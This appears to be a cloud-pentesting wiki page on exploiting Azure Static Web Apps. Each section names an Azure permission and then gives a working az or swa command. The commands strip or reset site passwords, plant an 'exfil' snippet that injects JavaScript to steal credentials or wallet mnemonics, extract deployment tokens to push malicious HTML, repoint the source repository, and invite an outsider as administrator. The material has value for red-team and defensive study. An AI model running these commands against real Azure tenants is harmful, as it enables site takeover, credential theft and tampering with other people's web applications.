---
title: "Azure Static Web Apps Explotation"
order: 102
description: Explotation of Azure Static Web Apps
---

## Modify the password of static web app

> The permission needed is:
> - **Microsoft.Web/staticSites/config/write**
>
> With this permission, it’s possible to modify the password protecting a static web app or even unprotect every environment by sending a request such as the following:

```bash
az rest --method put \
  --url "/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Web/staticSites/$WEBAPP_NAME/config/basicAuth?api-version=2021-03-01" \
  --headers 'Content-Type=application/json' \
  --body '{
    "name": "basicAuth",
    "type": "Microsoft.Web/staticSites/basicAuth",
    "properties": {
        "password": "SuperPassword123.",
        "secretUrl": "",
        "applicableEnvironmentsMode": "AllEnvironments"
        }
  }'
```

## Create malicious snippet

> The permission required is:
> - **Microsoft.Web/staticSites/snippets/write**
>
> It’s possible to make a static web page load arbitary HTML code by creating a snippet. This could allow an attacker to inject JS code inside the web app and steal sensitive information such as credentials or mnemonic keys (in web3 wallets).

```bash
az rest \
  --method PUT \
  --uri "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Web/staticSites/$WEBAPP_NAME/snippets/exfil?api-version=2022-03-01" \
  --headers "Content-Type=application/json" \
  --body '{
    "properties": {
        "name": "exfil",
        "location": "Body",
        "applicableEnvironmentsMode": "AllEnvironments",
        "content": "<base64_command>",
        "environments": [],
        "insertBottom": false
    }
  }'
```

## Get API Key deployment token

> The permission needed is:
> - **Microsoft.Web/staticSites/listSecrets/action**
>
> This permission allows to get the API key deployment token for the static app.

```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/listSecrets?api-version=2023-01-01"
```

```bash
az staticwebapp secrets list --name $WEBAPP_NAME --resource-group $RESOURCE_GROUP
```

### Deploy malicious html

With the key an attacker could load malicious html using:

```bash
swa deploy /tmp/swa-deploy \
  --deployment-token 0bbf203e85e5f6a0874ea37b94a0f2ff01d9dae52ae6dbd40e9303af9012a1b407-... \
  --env production
```

## Modify the source of the static web app

> The permission needed is:
> - **Microsoft.Web/staticSites/write**
>
> With this permission it’s possible to change the source of the static web app to a different Github repository, however, it won’t be automatically provisioned as this must be done from a Github Action. However, if the Deployment Authotization Policy is set to Github, it’s possible to update the app from the new source repository!.

```bash
az rest --method PUT \
  --url "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Web/staticSites/$WEBAPP_NAME?api-version=2022-09-01" \
  --headers 'Content-Type=application/json' \
  --body '{
    "location": "centralus",
    "properties": {
        "allowConfigFileUpdates": true,
        "stagingEnvironmentPolicy": "Enabled",
        "buildProperties": {
            "appLocation": "/",
            "apiLocation": "",
            "appArtifactLocation": "build"
        },
        "repositoryToken": "<github_token>0",
        "repositoryUrl": "<github_repo>",
        "branch": "main",
        "deploymentAuthPolicy": "GitHub",
        "provider": "GitHub"
    }
}'
```

## Invite users

> The permission required is:
> - **Microsoft.Web/staticSites/createUserInvitation/action**
> 
> This permission allows to create an invitation to a user to access protected paths inside a static web app ith a specific given role. The login is located in a path such as /.auth/login/github for github or /.auth/login/aad for Entra ID and a user can be invited with the following command:

```bash
az staticwebapp users invite \
    --authentication-provider Github \
    --domain <app_domain> \
    --invitation-expiration-in-hours 168 \
    --name $WEBAPP_NAME$ \
    --roles "administrator" \
    --user-details <github_username> \
    --resource-group $RESOURCE_GROUP \
    --output json | jq -r '.invitationUrl'
```